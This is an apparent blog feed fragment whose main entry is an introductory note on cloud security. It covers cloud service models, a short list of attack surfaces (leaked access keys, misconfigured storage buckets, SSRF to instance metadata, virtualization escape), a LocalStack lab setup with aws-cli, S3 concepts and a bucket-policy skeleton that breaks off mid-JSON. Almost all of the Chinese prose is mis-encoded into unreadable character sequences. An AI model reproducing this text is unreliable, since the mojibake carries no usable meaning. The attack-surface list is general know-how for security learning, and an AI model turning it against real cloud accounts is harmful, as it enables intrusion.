    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;broåŸå…ˆçš„äºŒæ‰‹çº¢ç±³ç”¨äº†ä¸‰å¹´ä¸»æ¿çƒ§äº†ï¼Œç´¢æ€§æ¢äº†å°èƒ½ç›´æ¥è§£ bl çš„ä¸€åŠ  ace5proï¼Œå°±è¿™æ ·ï¼Œä»è§£ bl å…¥é—¨åˆ°å˜ç –é€Ÿé€šï¼ˆbushiï¼‰&lt;/p&gt;</summary>
    
    
    
    
    <category term="Android" scheme="http://c1oudfl0w0.github.io/blog/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>äº‘å®‰å…¨å…¥é—¨</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/08/28/%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/08/28/%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8/</id>
    <published>2025-08-28T01:23:50.000Z</published>
    <updated>2026-01-08T09:57:34.632Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‚è€ƒï¼š</p><p><a href="https://wiki.teamssix.com/CloudService/">https://wiki.teamssix.com/CloudService/</a></p><p><a href="https://github.com/bfengj/Cloud-Security?tab=readme-ov-file">https://github.com/bfengj/Cloud-Security?tab=readme-ov-file</a></p><p><a href="https://lzcloudsecurity.gitbook.io/yun-an-quan-gong-fang-ru-men/">https://lzcloudsecurity.gitbook.io/yun-an-quan-gong-fang-ru-men/</a></p><span id="more"></span><hr><h1 id="äº‘è®¡ç®—æ¦‚å¿µ"><a href="#äº‘è®¡ç®—æ¦‚å¿µ" class="headerlink" title="äº‘è®¡ç®—æ¦‚å¿µ"></a>äº‘è®¡ç®—æ¦‚å¿µ</h1><p>äº‘è®¡ç®—æ˜¯ä¸€ç§è®¡ç®—æ¨¡å‹ï¼Œå®ƒæä¾›äº†ä¸€ç§é€šè¿‡äº’è”ç½‘è¿œç¨‹ä½¿ç”¨å…±äº«è®¡ç®—èµ„æºçš„æ–¹å¼ã€‚è¿™äº›è®¡ç®—èµ„æºåŒ…æ‹¬è®¡ç®—æœºå¤„ç†èƒ½åŠ›ã€å­˜å‚¨ç©ºé—´ã€æ•°æ®åº“å’Œè½¯ä»¶ç­‰ã€‚è¿™æ ·ï¼Œç”¨æˆ·å°±å¯ä»¥åœ¨éœ€è¦æ—¶éšæ—¶éšåœ°è·å–è¿™äº›èµ„æºï¼Œè€Œä¸ç”¨è‡ªå·±æ‹¥æœ‰å’Œç»´æŠ¤è¿™äº›ç¡¬ä»¶å’Œè½¯ä»¶ã€‚</p><h2 id="æ¨¡å¼"><a href="#æ¨¡å¼" class="headerlink" title="æ¨¡å¼"></a>æ¨¡å¼</h2><p><img src="/blog/2025/08/28/%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8/IMG-20250828092948551.png"></p><ul><li>IaaS (Infrastructure-as-a-Service)ï¼šåŸºç¡€è®¾æ–½å³æœåŠ¡ã€‚è¿™ç§æ¨¡å¼æä¾›äº†åŸºç¡€è®¾æ–½å±‚çš„æœåŠ¡ï¼Œå¦‚è™šæ‹Ÿæœºã€å­˜å‚¨ã€ç½‘ç»œç­‰ï¼Œç”¨æˆ·å¯ä»¥æ ¹æ®éœ€è¦è‡ªå·±æ­å»ºå’Œç®¡ç†ç³»ç»Ÿã€‚</li><li>PaaS (Platform-as-a-Service)ï¼šå¹³å°å³æœåŠ¡ã€‚è¿™ç§æ¨¡å¼æä¾›äº†å¹³å°å±‚çš„æœåŠ¡ï¼Œå¦‚æ•°æ®åº“ã€ç¼–ç¨‹æ¡†æ¶ç­‰ï¼Œç”¨æˆ·å¯ä»¥åœ¨è¿™ä¸ªå¹³å°ä¸Šå¼€å‘å’Œéƒ¨ç½²è‡ªå·±çš„åº”ç”¨ç¨‹åºã€‚</li><li>SaaS (Software-as-a-Service)ï¼šè½¯ä»¶å³æœåŠ¡ã€‚è¿™ç§æ¨¡å¼æä¾›äº†åº”ç”¨å±‚çš„æœåŠ¡ï¼Œå¦‚ç”µå­é‚®ä»¶ã€åä½œå·¥å…·ç­‰ï¼Œç”¨æˆ·å¯ä»¥ç›´æ¥ä½¿ç”¨è¿™äº›è½¯ä»¶ã€‚ä¼˜ç‚¹æ˜¯å‡å°‘å®‰è£…ã€å‡å°‘çš„ç¹çå‡çº§æ“ä½œã€ç»Ÿä¸€ç®¡ç†ã€‚</li></ul><h2 id="åˆ†ç±»"><a href="#åˆ†ç±»" class="headerlink" title="åˆ†ç±»"></a>åˆ†ç±»</h2><ul><li>å…¬æœ‰äº‘ï¼šå…¬æœ‰äº‘æ˜¯ç”±äº‘æœåŠ¡æä¾›å•†æä¾›çš„æœåŠ¡ï¼Œå¯ä»¥ç”±å¤šä¸ªå®¢æˆ·å…±äº«ã€‚å¸¸è§çš„å…¬æœ‰äº‘æœåŠ¡åŒ…æ‹¬äºšé©¬é€Šäº‘ï¼ˆAWSï¼‰ã€è°·æ­Œäº‘ï¼ˆGCPï¼‰ã€å¾®è½¯äº‘ï¼ˆAzureï¼‰ç­‰ã€‚å…¬æœ‰äº‘é€šå¸¸æä¾›è‡ªåŠ¨åŒ–ã€å¼¹æ€§å’Œå¯ä¼¸ç¼©æ€§ï¼Œé€‚ç”¨äºåº”ç”¨ç¨‹åºå’Œæ•°æ®çš„å¼€å‘å’Œéƒ¨ç½²ã€‚</li><li>ç§æœ‰äº‘ï¼šç§æœ‰äº‘æ˜¯ç”±å•ä¸ªç»„ç»‡æ‹¥æœ‰å’Œç®¡ç†çš„äº‘æœåŠ¡ï¼Œåªèƒ½ç”±è¯¥ç»„ç»‡çš„å‘˜å·¥ä½¿ç”¨ã€‚ç§æœ‰äº‘å¸¸ç”¨äºä¿æŠ¤æ•æ„Ÿæ•°æ®å’Œæ»¡è¶³ç‰¹æ®Šéœ€æ±‚ã€‚ç§æœ‰äº‘æä¾›äº†æ›´é«˜çš„å®‰å…¨æ€§å’Œæ§åˆ¶æ€§ï¼Œé€‚ç”¨äºæ•°æ®ä¸­å¿ƒçš„è¿ç§»å’Œç°æœ‰åº”ç”¨ç¨‹åºçš„å‡çº§ã€‚</li><li>æ··åˆäº‘ï¼šæ··åˆäº‘æ˜¯ç§æœ‰äº‘å’Œå…¬æœ‰äº‘çš„ç»“åˆã€‚å®ƒå…è®¸ç»„ç»‡åœ¨å…¬æœ‰äº‘å’Œç§æœ‰äº‘ä¹‹é—´è¿›è¡Œæ•°æ®å’Œåº”ç”¨ç¨‹åºçš„æµåŠ¨ã€‚æ··åˆäº‘å¯ä»¥æä¾›æœ€ä½³çš„å®‰å…¨æ€§å’Œçµæ´»æ€§ï¼Œé€‚ç”¨äºå¤šç§ä¸šåŠ¡åœºæ™¯ã€‚</li></ul><p>å»ºç«‹äº‘ç¯å¢ƒæ—¶ä¼šç”¨åˆ°è™šæ‹ŸåŒ–ï¼ˆKVMã€Vmwareï¼‰å’Œå®¹å™¨åŒ–ï¼ˆK8Sã€Dockerï¼‰æŠ€æœ¯</p><hr><h1 id="æ”»å‡»é¢"><a href="#æ”»å‡»é¢" class="headerlink" title="æ”»å‡»é¢"></a>æ”»å‡»é¢</h1><h2 id="å…¬æœ‰äº‘"><a href="#å…¬æœ‰äº‘" class="headerlink" title="å…¬æœ‰äº‘"></a>å…¬æœ‰äº‘</h2><p>éœ€è¦å…ˆäº†è§£å¯¹åº”å…¬æœ‰äº‘çš„æ–‡æ¡£ï¼š</p><p>AWSï¼š<a href="https://docs.aws.amazon.com/">https://docs.aws.amazon.com/</a><br>GCPï¼š<a href="https://cloud.google.com/docs?hl=zh-cn">https://cloud.google.com/docs?hl=zh-cn</a><br>Azureï¼š<a href="https://azure.microsoft.com/zh-cn/">https://azure.microsoft.com/zh-cn/</a><br>é˜¿é‡Œäº‘ï¼š<a href="https://help.aliyun.com/">https://help.aliyun.com/</a><br>è…¾è®¯äº‘ï¼š<a href="https://cloud.tencent.com/document/api">https://cloud.tencent.com/document/api</a></p><p>æ”»å‡»ä¸»è¦åˆ†ä¸ºä¸¤ç±»ï¼š</p><p>é’ˆå¯¹ç§Ÿæˆ·çš„æ”»å‡»ï¼šå¯¹äºåœ¨äº‘ä¸Šçš„ç›®æ ‡ï¼Œä¾ç„¶å­˜åœ¨å¸¸è§çš„Webæ¼æ´ï¼ŒSQLæ³¨å…¥ã€å¼±å£ä»¤ã€æ–‡ä»¶ä¸Šä¼ ã€SSRFï¼Œé™¤æ­¤ä¹‹å¤–ä¸Šäº‘è¿˜å‡ºç°äº†æ–°çš„æ”»å‡»æ–¹å¼ï¼Œä¾‹å¦‚ï¼šAccessKeyæ³„éœ²æ¥ç®¡æœåŠ¡å™¨ã€å­˜å‚¨æ¡¶é…ç½®ä¸å½“ã€ä¼ ç»Ÿæ¼æ´ç»“åˆäº‘ç‰¹æ€§è·å–å®ä¾‹å…ƒæ•°æ®ã€‚</p><p>é’ˆå¯¹äº‘å¹³å°çš„æ”»å‡»ï¼š</p><ol><li>äº‘äº§å“è¿›è¡Œæ–‡ä»¶å¤„ç†å±æ€§æ—¶å¼•å‘æ¼æ´</li><li>æ”»å‡»ä¸­é—´ä»¶</li><li>æ•°æ®åº“äº§å“é…ç½®</li><li>å¼€æºäº§å“å·²çŸ¥é—®é¢˜</li><li>è™šæ‹ŸåŒ–é€ƒé€¸</li></ol><h2 id="ç§æœ‰äº‘"><a href="#ç§æœ‰äº‘" class="headerlink" title="ç§æœ‰äº‘"></a>ç§æœ‰äº‘</h2><p>é™¤äº†å…¬æœ‰äº‘çš„æ”»å‡»ç‚¹ä»¥å¤–ï¼Œè¿˜æœ‰ï¼š</p><ol><li>ç§æœ‰äº‘ç¼ºä¹æœ‰æ•ˆéš”ç¦»ï¼Œå¯æ¨ªå‘æ”»å‡»</li><li>ä½¿ç”¨çš„å¼€æºç»„ä»¶åˆ—è¡¨æ¼æ´</li><li>è™šæ‹ŸåŒ–é€ƒé€¸å–å¾—å®¿ä¸»æœºæ§åˆ¶æƒ</li><li>å¸¸è§„åº”ç”¨æ¼æ´ï¼ˆShiroã€Fastjson ç­‰â€¦ï¼‰</li></ol><p>è™šæ‹ŸåŒ–</p><p>äº‘åŸç”Ÿ</p><hr><h1 id="AWS"><a href="#AWS" class="headerlink" title="AWS"></a>AWS</h1><blockquote><p>å…¨ç§° Amazon web service (äºšé©¬é€Šç½‘ç»œæœåŠ¡)ï¼Œæ˜¯äºšé©¬é€Šå…¬å¸æ——ä¸‹äº‘è®¡ç®—æœåŠ¡å¹³å°ï¼Œä¸ºå…¨ä¸–ç•Œå„ä¸ªå›½å®¶å’Œåœ°åŒºçš„å®¢æˆ·æä¾›ä¸€æ•´å¥—åŸºç¡€è®¾æ–½å’Œäº‘è§£å†³æ–¹æ¡ˆã€‚</p></blockquote><p>ä»¥ AWS ä¸ºä¾‹ï¼Œå…·æœ‰å¦‚ä¸‹äº‘æœåŠ¡ï¼ˆå„ä¸ªå‚å•†å«æ³•å¯èƒ½æœ‰æ‰€åŒºåˆ«ï¼‰ï¼š</p><ul><li><p>S3ï¼šå¯¹è±¡å­˜å‚¨ Simple Storage Serviceï¼Œç®€å•çš„è¯´å°±æ˜¯ä¸€ä¸ªç±»ä¼¼ç½‘ç›˜çš„ä¸œè¥¿ï¼Œå½“ç„¶è·Ÿç½‘ç›˜æ˜¯æœ‰ä¸€å®šåŒºåˆ«çš„ã€‚</p></li><li><p>EC2ï¼šå¼¹æ€§è®¡ç®—æœåŠ¡ Elastic Compute Cloudï¼Œç®€å•çš„è¯´å°±æ˜¯åœ¨äº‘ä¸Šçš„ä¸€å°è™šæ‹Ÿæœºã€‚</p></li><li><p>RDSï¼šäº‘æ•°æ®åº“ Relational Database Serviceï¼Œç®€å•çš„è¯´å°±æ˜¯äº‘ä¸Šçš„ä¸€ä¸ªæ•°æ®åº“ã€‚</p></li><li><p>IAMï¼šèº«ä»½å’Œè®¿é—®ç®¡ç† Identity and Access Managementï¼Œç®€å•çš„è¯´å°±æ˜¯äº‘æ§åˆ¶å°ä¸Šçš„ä¸€å¥—èº«ä»½ç®¡ç†æœåŠ¡ï¼Œå¯ä»¥ç”¨æ¥ç®¡ç†æ¯ä¸ªå­è´¦å·çš„æƒé™ã€‚</p></li></ul><p>ä»å­˜å‚¨æ¥è¯´ï¼ŒAWS æä¾›äº† S3 ä½œä¸ºå¯¹è±¡å­˜å‚¨å·¥å…·ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬å­˜å‚¨å¤§é‡çš„æ•°æ®ï¼Œå¹¶ä¸” S3 å¯ä»¥è¢« AWS çš„å…¶ä»–æœåŠ¡æ‰€è®¿é—®</p><p>ä»æœåŠ¡å™¨èµ„æºæ¥è¯´ï¼ŒAWS æä¾›äº† EC2 ä½œä¸ºè™šæ‹ŸåŒ–çš„äº‘æœåŠ¡å™¨ï¼Œæä¾›å„ç§ç±»å‹çš„ä¸»æœºï¼Œå¦‚è®¡ç®—å‹ã€é€šç”¨å‹ã€å†…å­˜è®¡ç®—å‹ã€GPU è®¡ç®—å‹ï¼Œç­‰ç­‰æ¥æ»¡è¶³ä¸šåŠ¡å¯¹æœåŠ¡å™¨çš„éœ€è¦</p><p>åœ¨æ•°æ®åº“æ–¹é¢ï¼ŒAWS æä¾›äº†å¦‚ RDSï¼ˆåŒ…å« Mysqlã€MariaDBã€Postgresqlï¼‰ä½œä¸ºå…³ç³»å‹å­˜å‚¨ä»¥åŠåˆ†å¸ƒå¼å¤§å‹å…³ç³»å‹æ•°æ®åº“ Auroraï¼ŒåŒæ—¶æä¾›äº†å¤šç§ Nosql æ•°æ®åº“ï¼Œå¦‚ DynamoDB ç­‰ï¼Œä»¥åŠæ•°ä»“å¦‚ RedShift</p><hr><h2 id="LocalStack-æ­å»ºæœ¬åœ°ç¯å¢ƒ"><a href="#LocalStack-æ­å»ºæœ¬åœ°ç¯å¢ƒ" class="headerlink" title="LocalStack æ­å»ºæœ¬åœ°ç¯å¢ƒ"></a>LocalStack æ­å»ºæœ¬åœ°ç¯å¢ƒ</h2><p>æ€»ä¹‹æ˜¯ä¸€ä¸ªèƒ½åœ¨æœ¬åœ°èµ·äº‘æœåŠ¡ç¯å¢ƒçš„å·¥å…·</p><p><a href="https://docs.localstack.cloud/aws/getting-started/installation/">https://docs.localstack.cloud/aws/getting-started/installation/</a></p><p><a href="https://www.freebuf.com/articles/container/409775.html">https://www.freebuf.com/articles/container/409775.html</a></p><p><a href="https://juejin.cn/post/7116453600338903048">https://juejin.cn/post/7116453600338903048</a></p><p><a href="https://blog.csdn.net/mzl87/article/details/140460913">https://blog.csdn.net/mzl87/article/details/140460913</a></p><p>è¿™é‡Œç”¨ docker compose èµ·äº†</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">services</span><span class="token punctuation">:</span>  <span class="token key atrule">localstack</span><span class="token punctuation">:</span>    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> <span class="token string">"$&#123;LOCALSTACK_DOCKER_NAME:-localstack-main&#125;"</span>    <span class="token key atrule">image</span><span class="token punctuation">:</span> localstack/localstack    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">"127.0.0.1:4566:4566"</span>            <span class="token comment"># LocalStack Gateway</span>      <span class="token punctuation">-</span> <span class="token string">"127.0.0.1:4510-4559:4510-4559"</span>  <span class="token comment"># external services port range</span>    <span class="token key atrule">environment</span><span class="token punctuation">:</span>      <span class="token comment"># LocalStack configuration: https://docs.localstack.cloud/references/configuration/</span>      <span class="token punctuation">-</span> DEBUG=$<span class="token punctuation">&#123;</span>DEBUG<span class="token punctuation">:</span><span class="token number">-0</span><span class="token punctuation">&#125;</span>    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">"$&#123;LOCALSTACK_VOLUME_DIR:-./volume&#125;:/var/lib/localstack"</span>      <span class="token punctuation">-</span> <span class="token string">"/var/run/docker.sock:/var/run/docker.sock"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> compose up<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿›å…¥å®¹å™¨ï¼Œå®‰è£… aws-cliï¼Œå…·ä½“å®‰è£…ç‰ˆæœ¬è§ï¼š <a href="https://docs.aws.amazon.com/zh_cn/cli/latest/userguide/getting-started-install.html">https://docs.aws.amazon.com/zh_cn/cli/latest/userguide/getting-started-install.html</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token string">"https://awscli.amazonaws.com/awscli-exe-linux-aarch64.zip"</span> <span class="token parameter variable">-o</span> <span class="token string">"awscliv2.zip"</span><span class="token function">unzip</span> awscliv2.zip./aws/install<span class="token comment"># æˆ‘è¿™é‡Œæ˜¯rootç”¨æˆ·æ‰€ä»¥ç›´æ¥å®‰è£…</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/08/28/%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8/IMG-20250828152625536.png"></p><p>é…ç½® aws-cliï¼Œè¿™é‡Œ ak å’Œ sk éƒ½ç›´æ¥å¡« <code>test</code> äº†ï¼ŒåŒºåŸŸå¡« <code>us-east-1</code>ï¼Œæ ¼å¼å¡« <code>json</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws configure<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åå» ~&#x2F;.aws&#x2F;config ä¸‹æ·»åŠ ä¸€ä¸ªç«¯ç‚¹ urlï¼ŒæŒ‡å‘æœ¬åœ°æ­å»ºçš„ LocalStack æœåŠ¡ï¼Œè¿™æ ·åé¢å°±ä¸ç”¨åŠ  endpoint_url å‚æ•°äº†</p><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini"><span class="token section"><span class="token punctuation">[</span><span class="token section-name selector">default</span><span class="token punctuation">]</span></span><span class="token key attr-name">region</span> <span class="token punctuation">=</span> <span class="token value attr-value">us-east-1</span><span class="token key attr-name">output</span> <span class="token punctuation">=</span> <span class="token value attr-value">json</span><span class="token key attr-name">endpoint_url</span> <span class="token punctuation">=</span> <span class="token value attr-value">http://172.18.0.2:4566</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="S3-å¯¹è±¡å­˜å‚¨"><a href="#S3-å¯¹è±¡å­˜å‚¨" class="headerlink" title="S3 å¯¹è±¡å­˜å‚¨"></a>S3 å¯¹è±¡å­˜å‚¨</h2><p>å¯¹è±¡å­˜å‚¨ï¼ˆObject-Based Storageï¼‰ï¼Œä¹Ÿå¯ä»¥å«åšé¢å‘å¯¹è±¡çš„å­˜å‚¨ï¼Œç°åœ¨ä¹Ÿæœ‰ä¸å°‘å‚å•†ç›´æ¥æŠŠå®ƒå«åšäº‘å­˜å‚¨ã€‚</p><p>Amazon S3 (Simple Storage Service) ç®€å•å­˜å‚¨æœåŠ¡ï¼Œæ˜¯ Amazon çš„å…¬å¼€äº‘å­˜å‚¨æœåŠ¡ï¼Œä¸ä¹‹å¯¹åº”çš„åè®®è¢«ç§°ä¸º S3 åè®®ï¼Œç›®å‰ S3 åè®®å·²ç»è¢«è§†ä¸ºå…¬è®¤çš„è¡Œä¸šæ ‡å‡†åè®®ï¼Œå› æ­¤ç›®å‰å›½å†…ä¸»æµçš„å¯¹è±¡å­˜å‚¨å‚å•†åŸºæœ¬ä¸Šéƒ½ä¼šæ”¯æŒ S3 åè®®ã€‚</p><p>åœ¨ Amazon S3 æ ‡å‡†ä¸‹ä¸­ï¼Œå¯¹è±¡å­˜å‚¨ä¸­å¯ä»¥æœ‰å¤šä¸ªæ¡¶ï¼ˆBucketï¼‰ï¼Œç„¶åæŠŠå¯¹è±¡ï¼ˆObjectï¼‰æ”¾åœ¨æ¡¶é‡Œï¼Œå¯¹è±¡åˆåŒ…å«äº†ä¸‰ä¸ªéƒ¨åˆ†ï¼š<code>Key</code>ã€<code>Data</code> å’Œ <code>Metadata</code></p><p><img src="/blog/2025/08/28/%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8/IMG-20250828100454222.png"></p><ul><li><p><code>Key</code> æ˜¯æŒ‡å­˜å‚¨æ¡¶ä¸­çš„å”¯ä¸€æ ‡è¯†ç¬¦ï¼Œä¾‹å¦‚ä¸€ä¸ª URL ä¸ºï¼š<code>https://teamssix.s3.ap-northeast-2.amazonaws.com/flag</code>ï¼Œè¿™é‡Œçš„ teamssix æ˜¯å­˜å‚¨æ¡¶ Bucket çš„åç§°ï¼Œ&#x2F;flag å°±æ˜¯ Key</p></li><li><p><code>Data</code> å°±å¾ˆå®¹æ˜“ç†è§£ï¼Œå°±æ˜¯å­˜å‚¨çš„æ•°æ®æœ¬ä½“</p></li><li><p><code>Metadata</code> å³å…ƒæ•°æ®ï¼Œå¯ä»¥ç®€å•çš„ç†è§£æˆæ•°æ®çš„æ ‡ç­¾ã€æè¿°ä¹‹ç±»çš„ä¿¡æ¯ï¼Œè¿™ç‚¹ä¸åŒäºä¼ ç»Ÿçš„æ–‡ä»¶å­˜å‚¨ï¼Œåœ¨ä¼ ç»Ÿçš„æ–‡ä»¶å­˜å‚¨ä¸­è¿™ç±»ä¿¡æ¯æ˜¯ç›´æ¥å°è£…åœ¨æ–‡ä»¶é‡Œçš„ï¼Œæœ‰äº†å…ƒæ•°æ®çš„å­˜åœ¨ï¼Œå¯ä»¥å¤§å¤§çš„åŠ å¿«å¯¹è±¡çš„æ’åºã€åˆ†ç±»å’ŒæŸ¥æ‰¾ã€‚</p></li></ul><p>æ“ä½œ S3 çš„æ–¹å¼ï¼š</p><ul><li>AWS æ§åˆ¶å°</li><li>AWS-cli</li><li>AWS SDK</li><li>REST API</li></ul><h3 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h3><p>Bucketï¼šå­˜å‚¨æ¡¶ï¼Œé»˜è®¤ä¸å…¬å¼€</p><p>ç‰¹ç‚¹ï¼š</p><ul><li>å‘½åéœ€å…¨çƒå”¯ä¸€ã€‚æ¯ä¸ªå¸å·é»˜è®¤å¯å»º 100 ä¸ªï¼Œå¯ç”³è¯·è‡³æœ€å¤š 1000 ä¸ª</li><li>åˆ›å»ºè€…çš„æ‹¥æœ‰æƒä¸å¯è½¬è®©ï¼Œä¹Ÿä¸å¯ä»¥ä»ä¸€ä¸ª Region è½¬å»åˆ«çš„ Region</li><li>æ²¡æœ‰å¯¹è±¡å­˜å‚¨æ•°é‡é™åˆ¶<br></li></ul><p>Objectï¼šBucket é‡Œé¢æ¯ä¸€ä¸ªå­˜å‚¨çš„æ•°æ®å°±æ˜¯å¯¹è±¡ï¼Œç”±å¯¹è±¡åï¼ˆé”®ï¼‰ï¼Œå’Œæ•°æ®ï¼ˆå€¼ï¼‰ç»„æˆ</p><p>å¯¹è±¡çš„é”®ï¼ˆKeyï¼‰å¯ä»¥å¾ˆé•¿ï¼Œç”šè‡³æŒ‰ç…§ä¸€å®šå‰ç¼€æ ¼å¼æ¥æŒ‡å®šï¼Œä»è€Œæ¨¡æ‹Ÿæ–‡ä»¶å¤¹çš„å±‚çº§ç»“æ„ï¼Œæ¯”å¦‚ Photo&#x2F;Family&#x2F;2020-01-25-new-year&#x2F;altogether.jpg</p><p>æ¯ä¸€ä¸ªå¯¹è±¡å…¶å®è¿˜åŒ…å«ä¸€äº›å…ƒä¿¡æ¯ï¼ˆMeta-dataï¼‰ï¼ŒåŒ…æ‹¬ç³»ç»ŸæŒ‡å®šçš„æ–‡ä»¶ç±»å‹ï¼Œåˆ›å»ºæ—¶é—´ï¼ŒåŠ å¯†ç®—æ³•ç­‰ï¼Œå’Œç”¨æˆ·ä¸Šä¼ æ—¶æŒ‡å®šçš„å…ƒä¿¡æ¯ã€‚å…ƒä¿¡æ¯åœ¨å¯¹è±¡åˆ›å»ºåéƒ½æ— æ³•æ›´æ”¹ã€‚</p><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥ä¸ºå¯¹è±¡æŒ‡å®šæœ€å¤š 10 ä¸ªæ ‡ç­¾ï¼ˆTagï¼‰ï¼Œæ ‡ç­¾çš„é”®å’Œå€¼çš„æœ€å¤§é•¿åº¦æ˜¯ 128 å’Œ 256 ä¸ªå­—ç¬¦ã€‚è¿™ä¸ªæ ‡ç­¾å’Œå…ƒä¿¡æ¯æœ‰ä»€ä¹ˆä¸åŒå‘¢ï¼Ÿæ ‡ç­¾æ˜¯å¯ä»¥ä¿®æ”¹å’Œæ–°å¢çš„ã€‚å®ƒæœ€å¤§çš„å¥½å¤„ï¼Œæ˜¯å¯ä»¥ç»“åˆæƒé™æ§åˆ¶ï¼Œç”Ÿå‘½å‘¨æœŸç®¡ç†ï¼Œå’Œæ•°æ®åˆ†æç­‰ä½¿ç”¨ã€‚</p><p>å•ä¸ªæ–‡ä»¶ä¸Šä¼ æœ€å¤§æ˜¯ 5GBã€‚è¶…è¿‡çš„è¯ï¼Œéœ€è¦ä½¿ç”¨ multipart upload APIã€‚æœ€å¤§æ”¯æŒ 5TBã€‚<br><br></p><p>ä¸€è‡´æ€§ç‰¹æ€§ï¼š</p><ul><li>æ²¡æœ‰é”çš„åŠŸèƒ½ã€‚å¦‚æœåŒæ—¶ï¼ˆå‡ ä¹ï¼‰å‘èµ·ä¸¤ä¸ªæ›´æ–°å¯¹è±¡çš„ PUT è¯·æ±‚ï¼Œé”®ç›¸åŒï¼Œé‚£ä¹ˆï¼Œä»¥åˆ°è¾¾ S 3 æ—¶é—´å…ˆåå¤„ç†æ›´æ–°ã€‚</li><li>ä¸åŒå¯¹è±¡çš„æ›´æ–°ï¼Œæ²¡æ³•åšåˆ°åŸå­æ“ä½œã€‚</li><li>å¯¹å…¨æ–°çš„å¯¹è±¡æ¥è¯´ï¼Œå®ƒæ˜¯ Read-after-Write Consistency çš„ã€‚ä¹Ÿå°±æ˜¯å†™äº†ä¹‹åé©¬ä¸Šè¯»ï¼Œè‚¯å®šå°±æ˜¯ä½ åˆšæ‰ä¸Šä¼ çš„æ•°æ®ã€‚</li><li>å¦‚æœä½ è¦æ›´æ–°æ•°æ®ï¼Œé‚£å°±å˜æˆ Eventual Consistency äº†ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ›´æ–°åé©¬ä¸Šè¯»ï¼Œå¯èƒ½æ˜¯æ—§çš„æ•°æ®ï¼Œä¹Ÿå¯èƒ½æ˜¯æ–°çš„ã€‚</li></ul><p>å¦‚æœä½ å…ˆè°ƒç”¨ GET è¯·æ±‚è®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„èµ„æºï¼ŒS3 å‘Šè¯‰ä½ å®ƒä¸å­˜åœ¨ã€‚ç„¶åä½ é©¬ä¸Šä¸Šä¼ æ•°æ®ï¼Œå†è°ƒç”¨ä¸€ä¸ª GETï¼Œè¿™æ—¶å€™æ˜¯æœ‰å¯èƒ½ä»ç„¶è¯·æ±‚ä¸åˆ°çš„<br><br><br>ç‰ˆæœ¬æ§åˆ¶ï¼šä¸€ç»å¯ç”¨æ— æ³•æš‚åœ</p><hr><h3 id="Bucket-Policy-åŸºç¡€ç»“æ„"><a href="#Bucket-Policy-åŸºç¡€ç»“æ„" class="headerlink" title="Bucket Policy åŸºç¡€ç»“æ„"></a>Bucket Policy åŸºç¡€ç»“æ„</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"Version"</span><span class="token operator">:</span><span class="token string">"2012-10-17"</span><span class="token punctuation">,</span>          <span class="token comment">// å¿…é¡»ï¼Œå½“å‰å›ºå®š</span>  <span class="token property">"Statement"</span><span class="token operator">:</span><span class="token punctuation">[</span>    <span class="token punctuation">&#123;</span>      <span class="token property">"Sid"</span><span class="token operator">:</span><span class="token string">"å¯é€‰å”¯ä¸€æ ‡è¯†ç¬¦"</span><span class="token punctuation">,</span>      <span class="token property">"Effect"</span><span class="token operator">:</span><span class="token string">"Allow"</span>|<span class="token string">"Deny"</span><span class="token punctuation">,</span>      <span class="token property">"Principal"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>        <span class="token property">"AWS"</span><span class="token operator">:</span><span class="token string">"arn:aws:iam::&lt;AWS_ACCOUNT_ID>:root"</span>          <span class="token comment">// æˆ–è€… &#123;"AWS":["arn1","arn2"]&#125; ç­‰</span>        <span class="token comment">// ä¹Ÿå¯ä»¥æ˜¯ "*"ï¼ˆåŒ¿åï¼‰æˆ– "Service":"s3.amazonaws.com"</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token property">"Action"</span><span class="token operator">:</span><span class="token punctuation">[</span>        <span class="token string">"s3:GetObject"</span><span class="token punctuation">,</span>        <span class="token string">"s3:PutObject"</span><span class="token punctuation">,</span>        <span class="token string">"s3:DeleteObject"</span><span class="token punctuation">,</span>        <span class="token string">"s3:ListBucket"</span><span class="token punctuation">,</span>        <span class="token 